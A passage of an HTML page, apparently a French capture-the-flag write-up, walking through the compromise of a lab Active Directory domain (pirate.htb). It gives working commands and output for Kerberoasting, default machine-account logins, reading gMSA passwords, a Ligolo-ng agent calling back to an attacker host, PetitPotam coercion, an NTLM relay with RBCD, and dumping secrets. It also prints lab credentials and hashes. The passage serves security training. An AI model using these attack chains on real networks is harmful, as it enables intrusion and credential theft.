+                    <a href="#kcd--alt-service--domain-admin" aria-label="KCD &#43; Alt-Service → Domain Admin">KCD + Alt-Service → Domain Admin</a></li>
+                <li>
+                    <a href="#root-flag" aria-label="Root Flag">Root Flag</a></li></ul>
+                </li>
+                <li>
+                    <a href="#kill-chain-visuel" aria-label="Kill Chain Visuel">Kill Chain Visuel</a></li>
+                <li>
+                    <a href="#scripts-custom" aria-label="Scripts Custom">Scripts Custom</a><ul>
+                        
+                <li>
+                    <a href="#gmsa_dumppy" aria-label="gmsa_dump.py">gmsa_dump.py</a></li>
+                <li>
+                    <a href="#spn_hijackpy" aria-label="spn_hijack.py">spn_hijack.py</a></li>
+                <li>
+                    <a href="#bloodhound_parserpy" aria-label="bloodhound_parser.py">bloodhound_parser.py</a></li></ul>
+                </li>
+                <li>
+                    <a href="#le%c3%a7ons-apprises" aria-label="Leçons apprises">Leçons apprises</a></li>
+                <li>
+                    <a href="#credentials-r%c3%a9cup%c3%a9r%c3%a9es" aria-label="Credentials récupérées">Credentials récupérées</a></li>
+                <li>
+                    <a href="#flags" aria-label="Flags">Flags</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><blockquote>
+<p><strong>OS:</strong> Windows Server 2019 | <strong>Difficulté:</strong> Hard | <strong>IP:</strong> 10.129.15.19 | <strong>Domain:</strong> pirate.htb</p>
+</blockquote>
+<hr>
+<h2 id="phase-1---reconnaissance">Phase 1 - Reconnaissance<a hidden class="anchor" aria-hidden="true" href="#phase-1---reconnaissance">#</a></h2>
+<h3 id="pourquoi-commencer-par-un-scan-de-ports-">Pourquoi commencer par un scan de ports ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-commencer-par-un-scan-de-ports-">#</a></h3>
+<p>Sur une machine Windows Hard, on s&rsquo;attend à un environnement Active Directory. Le scan révèle les services qui déterminent notre surface d&rsquo;attaque.</p>
+<h3 id="scan-de-ports">Scan de ports<a hidden class="anchor" aria-hidden="true" href="#scan-de-ports">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -Pn -p- --min-rate <span style="color:#ae81ff">5000</span> 10.129.15.19
+</span></span><span style="display:flex;"><span>nmap -Pn -sCV -p 53,80,88,135,389,445,636,3268,5985,9389 10.129.15.19
+</span></span></code></pre></div><p><strong>Résultats clés :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Port</th>
+<th>Service</th>
+<th>Info</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>53</td>
+<td>DNS</td>
+<td>Simple DNS Plus</td>
+</tr>
+<tr>
+<td>80</td>
+<td>HTTP</td>
+<td>IIS 10.0 (page par défaut)</td>
+</tr>
+<tr>
+<td>88</td>
+<td>Kerberos</td>
+<td>→ confirme AD</td>
+</tr>
+<tr>
+<td>389/636</td>
+<td>LDAP/S</td>
+<td>Domain: pirate.htb</td>
+</tr>
+<tr>
+<td>445</td>
+<td>SMB</td>
+<td>Signing: <strong>Required</strong></td>
+</tr>
+<tr>
+<td>5985</td>
+<td>WinRM</td>
+<td>Remote management</td>
+</tr>
+<tr>
+<td>2179</td>
+<td>vmrdp</td>
+<td>Hyper-V (indice réseau interne)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Réflexion :</strong> C&rsquo;est un <strong>Domain Controller</strong> (DC01.pirate.htb). Le port 2179 (Hyper-V vmrdp) est un indice crucial : le DC héberge probablement des VMs sur un réseau interne. Le SMB signing est required → pas de relay direct sur le DC.</p>
+<h3 id="validation-des-credentials">Validation des credentials<a hidden class="anchor" aria-hidden="true" href="#validation-des-credentials">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.129.15.19 -u <span style="color:#e6db74">&#39;pentest&#39;</span> -p <span style="color:#e6db74">&#39;p3nt3st2025!&amp;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># [+] pirate.htb\pentest:p3nt3st2025!&amp;</span>
+</span></span></code></pre></div><h3 id="clock-skew">Clock Skew<a hidden class="anchor" aria-hidden="true" href="#clock-skew">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Le DC a +7h de décalage - critique pour Kerberos</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Utiliser faketime pour toutes les opérations Kerberos</span>
+</span></span><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> &lt;commande&gt;
+</span></span></code></pre></div><p><strong>Pourquoi c&rsquo;est important ?</strong> Kerberos refuse les tickets si le décalage horaire dépasse 5 minutes. Sans <code>faketime</code>, toutes les opérations Kerberos échoueront avec <code>KRB_AP_ERR_SKEW</code>.</p>
+<hr>
+<h2 id="phase-2---enumération-ad">Phase 2 - Enumération AD<a hidden class="anchor" aria-hidden="true" href="#phase-2---enumération-ad">#</a></h2>
+<h3 id="pourquoi-énumérer-en-profondeur-">Pourquoi énumérer en profondeur ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-énumérer-en-profondeur-">#</a></h3>
+<p>Avec des credentials domain, on peut cartographier tout l&rsquo;AD : users, groupes, permissions, délégations, ADCS. C&rsquo;est cette cartographie qui révèle les chemins d&rsquo;attaque.</p>
+<h3 id="enumération-ldap---users">Enumération LDAP - Users<a hidden class="anchor" aria-hidden="true" href="#enumération-ldap---users">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ldapsearch -x -H ldap://10.129.15.19 -D <span style="color:#e6db74">&#39;pentest@pirate.htb&#39;</span> -w <span style="color:#e6db74">&#39;p3nt3st2025!&amp;&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -b <span style="color:#e6db74">&#39;DC=pirate,DC=htb&#39;</span> <span style="color:#e6db74">&#39;(objectClass=user)&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  sAMAccountName memberOf description userAccountControl
+</span></span></code></pre></div><p><strong>Users découverts :</strong></p>
+<table>
+<thead>
+<tr>
+<th>User</th>
+<th>Groupes</th>
+<th>UAC</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Administrator</td>
+<td>Domain Admins</td>
+<td>66048</td>
+<td>Cible finale</td>
+</tr>
+<tr>
+<td>a.white</td>
+<td>Domain Users</td>
+<td>66048</td>
+<td>Angela White</td>
+</tr>
+<tr>
+<td>a.white_adm</td>
+<td><strong>IT</strong></td>
+<td><strong>16843264</strong></td>
+<td>TRUSTED_TO_AUTH_FOR_DELEGATION, SPN: ADFS/a.white</td>
+</tr>
+<tr>
+<td>j.sparrow</td>
+<td>Domain Users</td>
+<td>66048</td>
+<td>Jack Sparrow</td>
+</tr>
+<tr>
+<td>pentest</td>
+<td>Domain Users</td>
+<td>66048</td>
+<td>Notre user</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Comptes machine intéressants :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Account</th>
+<th>Groupes</th>
+<th>UAC</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>MS01$</td>
+<td><strong>Domain Secure Servers</strong></td>
+<td><strong>4128</strong></td>
+<td>PASSWD_NOTREQD, Pre-Win2000</td>
+</tr>
+<tr>
+<td>EXCH01$</td>
+<td>Pre-Win2000</td>
+<td><strong>4128</strong></td>
+<td>PASSWD_NOTREQD</td>
+</tr>
+<tr>
+<td>WEB01$</td>
+<td>Domain Computers</td>
+<td>4096</td>
+<td>SPNs HTTP, tapinego</td>
+</tr>
+</tbody>
+</table>
+<p><strong>gMSA (Group Managed Service Accounts) :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Account</th>
+<th>Groupes</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>gMSA_ADCS_prod$</td>
+<td><strong>Remote Management Users</strong></td>
+<td>Service ADCS</td>
+</tr>
+<tr>
+<td>gMSA_ADFS_prod$</td>
+<td><strong>Remote Management Users</strong></td>
+<td>SPN: host/adfs.pirate.htb</td>
+</tr>
+</tbody>
+</table>
+<h3 id="pourquoi-ms01-et-exch01-sont-intéressants-">Pourquoi MS01$ et EXCH01$ sont intéressants ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-ms01-et-exch01-sont-intéressants-">#</a></h3>
+<p><code>userAccountControl: 4128</code> = WORKSTATION_TRUST_ACCOUNT (4096) + <strong>PASSWD_NOTREQD</strong> (32). Combiné avec l&rsquo;appartenance au groupe <strong>Pre-Windows 2000 Compatible Access</strong>, ces comptes ont probablement un <strong>mot de passe = nom de machine en lowercase</strong>.</p>
+<h3 id="bloodhound">BloodHound<a hidden class="anchor" aria-hidden="true" href="#bloodhound">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> bloodhound-python -u <span style="color:#e6db74">&#39;pentest&#39;</span> -p <span style="color:#e6db74">&#39;p3nt3st2025!&amp;&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -d pirate.htb -ns 10.129.15.19 -c All --zip
+</span></span></code></pre></div><p><strong>Chemins d&rsquo;attaque identifiés :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>a.white --[ForceChangePassword]--&gt; a.white_adm
+</span></span><span style="display:flex;"><span>IT group --[WriteSPN]--&gt; DC01$, WEB01$, MS01$, EXCH01$
+</span></span><span style="display:flex;"><span>a.white_adm --[Constrained Delegation]--&gt; HTTP/WEB01.pirate.htb
+</span></span><span style="display:flex;"><span>Domain Secure Servers --[ReadGMSAPassword]--&gt; gMSA_ADCS_prod$, gMSA_ADFS_prod$
+</span></span></code></pre></div><h3 id="kerberoast">Kerberoast<a hidden class="anchor" aria-hidden="true" href="#kerberoast">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> impacket-GetUserSPNs <span style="color:#e6db74">&#39;pirate.htb/pentest:p3nt3st2025!&amp;&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -dc-ip 10.129.15.19 -request -outputfile kerberoast.txt
+</span></span></code></pre></div><p>Hash récupéré pour <code>a.white_adm</code> (SPN: ADFS/a.white) mais <strong>non cracké</strong> avec rockyou + rules. Le password est trop fort.</p>
+<h3 id="adcs">ADCS<a hidden class="anchor" aria-hidden="true" href="#adcs">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> certipy find -u <span style="color:#e6db74">&#39;pentest@pirate.htb&#39;</span> -p <span style="color:#e6db74">&#39;p3nt3st2025!&amp;&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -dc-ip 10.129.15.19 -stdout
+</span></span></code></pre></div><ul>
+<li>CA: <code>pirate-DC01-CA</code> sur DC01</li>
+<li>Template <strong>ADFSSSLSigning</strong> : EnrolleeSuppliesSubject=True, EKU=Server Auth, Enroll=<strong>Domain Computers</strong></li>
+<li>MachineAccountQuota: <strong>10</strong></li>
+</ul>
+<hr>
+<h2 id="phase-3---pre-windows-2000--gmsa--winrm-sur-dc">Phase 3 - Pre-Windows 2000 → gMSA → WinRM sur DC<a hidden class="anchor" aria-hidden="true" href="#phase-3---pre-windows-2000--gmsa--winrm-sur-dc">#</a></h2>
+<h3 id="pourquoi-tester-les-comptes-pre-win2000-">Pourquoi tester les comptes Pre-Win2000 ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-tester-les-comptes-pre-win2000-">#</a></h3>
+<p>C&rsquo;est une faille classique en AD. Quand un admin crée un compte machine en mode &ldquo;Pre-Windows 2000 compatible&rdquo;, le password par défaut est le nom de la machine en lowercase sans le <code>$</code>. Si personne ne l&rsquo;a changé, on a les creds.</p>
+<h3 id="test-des-credentials-machines">Test des credentials machines<a hidden class="anchor" aria-hidden="true" href="#test-des-credentials-machines">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 10.129.15.19 -u <span style="color:#e6db74">&#39;MS01$&#39;</span> -p <span style="color:#e6db74">&#39;ms01&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT → password CORRECT !</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>nxc smb 10.129.15.19 -u <span style="color:#e6db74">&#39;EXCH01$&#39;</span> -p <span style="color:#e6db74">&#39;exch01&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT → password CORRECT !</span>
+</span></span></code></pre></div><p><strong>Pourquoi <code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code> = succès ?</strong> Cette erreur signifie que l&rsquo;authentification a réussi mais que le type de compte (WORKSTATION_TRUST) n&rsquo;est pas autorisé pour un logon SMB interactif. Le password est validé.</p>
+<h3 id="pourquoi-ms01-est-critique-">Pourquoi MS01$ est critique ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-ms01-est-critique-">#</a></h3>
+<p><code>MS01$</code> est dans le groupe <strong>Domain Secure Servers</strong> qui a le droit <strong>ReadGMSAPassword</strong> sur <code>gMSA_ADCS_prod$</code> et <code>gMSA_ADFS_prod$</code>. Ces gMSA sont dans <strong>Remote Management Users</strong> → WinRM sur le DC.</p>
+<h3 id="lecture-du-gmsa-via-kerberos">Lecture du gMSA via Kerberos<a hidden class="anchor" aria-hidden="true" href="#lecture-du-gmsa-via-kerberos">#</a></h3>
+<p><strong>Problème :</strong> Les comptes WORKSTATION_TRUST ne peuvent pas faire de simple LDAP bind (erreur 710). Il faut utiliser <strong>Kerberos</strong>.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Obtenir un TGT pour MS01$</span>
+</span></span><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> impacket-getTGT <span style="color:#e6db74">&#39;pirate.htb/MS01$:ms01&#39;</span> -dc-ip 10.129.15.19
+</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>MS01<span style="color:#ae81ff">\$</span>.ccache
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Lire le gMSA password via bloodyAD en Kerberos</span>
+</span></span><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> bloodyAD -d pirate.htb -u <span style="color:#e6db74">&#39;MS01$&#39;</span> -p <span style="color:#e6db74">&#39;ms01&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --host DC01.pirate.htb -k get object <span style="color:#e6db74">&#39;gMSA_ADCS_prod$&#39;</span> --attr msDS-ManagedPassword
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># msDS-ManagedPassword.NT: 25c7f0eb586ed3a91375dbf2f6e4a3ea</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> bloodyAD -d pirate.htb -u <span style="color:#e6db74">&#39;MS01$&#39;</span> -p <span style="color:#e6db74">&#39;ms01&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --host DC01.pirate.htb -k get object <span style="color:#e6db74">&#39;gMSA_ADFS_prod$&#39;</span> --attr msDS-ManagedPassword
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># msDS-ManagedPassword.NT: fd9ea7ac7820dba5155bd6ed2d850c09</span>
+</span></span></code></pre></div><h3 id="winrm-sur-le-dc">WinRM sur le DC<a hidden class="anchor" aria-hidden="true" href="#winrm-sur-le-dc">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 10.129.15.19 -u <span style="color:#e6db74">&#39;gMSA_ADCS_prod$&#39;</span> -H <span style="color:#e6db74">&#39;25c7f0eb586ed3a91375dbf2f6e4a3ea&#39;</span>
+</span></span></code></pre></div><p><strong>On est sur le DC !</strong> Mais en tant que gMSA, pas admin. Medium Plus integrity, pas de SeDebugPrivilege.</p>
+<h3 id="découverte-du-réseau-interne">Découverte du réseau interne<a hidden class="anchor" aria-hidden="true" href="#découverte-du-réseau-interne">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>ipconfig /all
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ethernet adapter vEthernet (Switch01):</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   IPv4 Address: 192.168.100.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ethernet adapter Ethernet0 2:</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#   IPv4 Address: 10.129.15.19</span>
+</span></span></code></pre></div><p><strong>Le DC est dual-homed !</strong> Interface interne <code>192.168.100.1</code> (Hyper-V). WEB01 est sur ce subnet.</p>
+<hr>
+<h2 id="phase-4---pivot-réseau-interne-avec-ligolo-ng">Phase 4 - Pivot réseau interne avec Ligolo-ng<a hidden class="anchor" aria-hidden="true" href="#phase-4---pivot-réseau-interne-avec-ligolo-ng">#</a></h2>
+<h3 id="pourquoi-ligolo-ng-">Pourquoi Ligolo-ng ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-ligolo-ng-">#</a></h3>
+<p>On doit accéder au réseau interne 192.168.100.0/24 depuis notre machine. Ligolo-ng crée un tunnel VPN-like performant via un agent sur le DC.</p>
+<h3 id="setup-ligolo-ng">Setup Ligolo-ng<a hidden class="anchor" aria-hidden="true" href="#setup-ligolo-ng">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Sur notre machine - créer l&#39;interface TUN</span>
+</span></span><span style="display:flex;"><span>sudo ip tuntap add user <span style="color:#66d9ef">$(</span>whoami<span style="color:#66d9ef">)</span> mode tun ligolo
+</span></span><span style="display:flex;"><span>sudo ip link set ligolo up
+</span></span><span style="display:flex;"><span>sudo ip route add 192.168.100.0/24 dev ligolo
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Lancer le proxy</span>
+</span></span><span style="display:flex;"><span>./ligolo-ng_proxy_0.8.3_linux_amd64 -selfcert -laddr 0.0.0.0:11601
+</span></span></code></pre></div><h3 id="upload-et-lancement-de-lagent-sur-le-dc">Upload et lancement de l&rsquo;agent sur le DC<a hidden class="anchor" aria-hidden="true" href="#upload-et-lancement-de-lagent-sur-le-dc">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Dans evil-winrm</span>
+</span></span><span style="display:flex;"><span>upload /tmp/ligolo-ng_agent_0.8.3_windows_amd64.exe C:\temp\agent.exe
+</span></span><span style="display:flex;"><span>C:\temp\agent.exe -connect <span style="color:#ae81ff">10.10</span>.17.<span style="color:#ae81ff">198</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">11601</span> -ignore-cert
+</span></span></code></pre></div><h3 id="activation-du-tunnel">Activation du tunnel<a hidden class="anchor" aria-hidden="true" href="#activation-du-tunnel">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span># Dans la console Ligolo
+</span></span><span style="display:flex;"><span>session
+</span></span><span style="display:flex;"><span># Sélectionner l&#39;agent DC01
+</span></span><span style="display:flex;"><span>start
+</span></span></code></pre></div><p><strong>ATTENTION :</strong> Si l&rsquo;agent se reconnecte, la route disparaît. Il faut la remettre :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo ip route add 192.168.100.0/24 dev ligolo
+</span></span></code></pre></div><h3 id="scan-du-réseau-interne">Scan du réseau interne<a hidden class="anchor" aria-hidden="true" href="#scan-du-réseau-interne">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -Pn -p 445,80,135,5985 192.168.100.0/24
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 192.168.100.1 → DC01 (déjà connu)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># 192.168.100.2 → WEB01 (HTTP:80, SMB:445, WinRM:5985)</span>
+</span></span></code></pre></div><h3 id="vérification-smb-signing">Vérification SMB signing<a hidden class="anchor" aria-hidden="true" href="#vérification-smb-signing">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nxc smb 192.168.100.2
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># (signing:False) → PARFAIT pour le relay NTLM !</span>
+</span></span></code></pre></div><hr>
+<h2 id="phase-5---ntlm-relay--rbcd-sur-web01">Phase 5 - NTLM Relay + RBCD sur WEB01<a hidden class="anchor" aria-hidden="true" href="#phase-5---ntlm-relay--rbcd-sur-web01">#</a></h2>
+<h3 id="pourquoi-le-relay-ntlm-">Pourquoi le relay NTLM ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-le-relay-ntlm-">#</a></h3>
+<p>WEB01 a SMB signing <strong>disabled</strong>. On peut forcer WEB01 à s&rsquo;authentifier (coercion) puis relayer cette auth vers le LDAP du DC pour effectuer des actions en tant que WEB01$.</p>
+<h3 id="pourquoi-shadow-credentials-a-échoué-">Pourquoi Shadow Credentials a échoué ?<a hidden class="anchor" aria-hidden="true" href="#pourquoi-shadow-credentials-a-échoué-">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[-] Could not modify object, the server reports insufficient rights
+</span></span></code></pre></div><p>WEB01$ n&rsquo;a pas le droit de modifier son propre <code>msDS-KeyCredentialLink</code> via relay LDAP. <strong>Mais RBCD fonctionne</strong> car WEB01$ peut écrire <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> sur lui-même.</p>
+<h3 id="setup-de-lattaque">Setup de l&rsquo;attaque<a hidden class="anchor" aria-hidden="true" href="#setup-de-lattaque">#</a></h3>
+<p><strong>Terminal 1 - ntlmrelayx</strong> (arrêter Responder d&rsquo;abord) :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo impacket-ntlmrelayx -t ldap://192.168.100.1 --remove-mic <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  --delegate-access -smb2support
+</span></span></code></pre></div><p><strong>Pourquoi <code>--remove-mic</code> ?</strong> Le Message Integrity Code (MIC) protège normalement contre le relay. Ce flag le supprime pour permettre le relay LDAP.</p>
+<p><strong>Pourquoi <code>--delegate-access</code> ?</strong> ntlmrelayx va automatiquement :</p>
+<ol>
+<li>Créer un nouveau compte machine</li>
+<li>Configurer RBCD sur WEB01$ pour que ce compte puisse impersonner des users</li>
+</ol>
+<p><strong>Terminal 2 - PetitPotam</strong> (coercion) :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 PetitPotam.py -d pirate.htb -u pentest -p <span style="color:#e6db74">&#39;p3nt3st2025!&amp;&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  10.10.17.198 192.168.100.2
+</span></span></code></pre></div><p><strong>Résultat :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[+] Attack worked!
+</span></span><span style="display:flex;"><span>[*] Authenticating against ldap://192.168.100.1 as PIRATE/WEB01$ SUCCEED
+</span></span><span style="display:flex;"><span>[*] Adding new computer with username: LPQQLPUC$ and password: eCWqO6GJrjvDqy} result: OK
+</span></span><span style="display:flex;"><span>[*] Delegation rights modified succesfully!
+</span></span><span style="display:flex;"><span>[*] LPQQLPUC$ can now impersonate users on WEB01$ via S4U2Proxy
+</span></span></code></pre></div><h3 id="s4u2proxy--admin-local-web01">S4U2Proxy → Admin local WEB01<a hidden class="anchor" aria-hidden="true" href="#s4u2proxy--admin-local-web01">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># Obtenir un ticket CIFS/WEB01 en tant qu&#39;Administrator</span>
+</span></span><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> impacket-getST -spn <span style="color:#e6db74">&#39;cifs/WEB01.pirate.htb&#39;</span> <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -impersonate Administrator -dc-ip 192.168.100.1 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;pirate.htb/LPQQLPUC$:eCWqO6GJrjvDqy}&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Ajouter WEB01 au hosts</span>
+</span></span><span style="display:flex;"><span>echo <span style="color:#e6db74">&#39;192.168.100.2 WEB01.pirate.htb WEB01&#39;</span> | sudo tee -a /etc/hosts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># SYSTEM shell ou dump secrets</span>
+</span></span><span style="display:flex;"><span>export KRB5CCNAME<span style="color:#f92672">=</span>Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
+</span></span><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> impacket-smbexec -k -no-pass <span style="color:#e6db74">&#39;pirate.htb/Administrator@WEB01.pirate.htb&#39;</span>
+</span></span></code></pre></div><h3 id="dump-des-secrets-web01">Dump des secrets WEB01<a hidden class="anchor" aria-hidden="true" href="#dump-des-secrets-web01">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>faketime -f <span style="color:#e6db74">&#39;+7h&#39;</span> impacket-secretsdump -k -no-pass <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  <span style="color:#e6db74">&#39;pirate.htb/Administrator@WEB01.pirate.htb&#39;</span> -use-vss
+</span></span></code></pre></div><p><strong>Résultat critique dans les LSA Secrets :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>[*] DefaultPassword
+</span></span><span style="display:flex;"><span>PIRATE\a.white:E2nvAOKSz5Xz2MJu
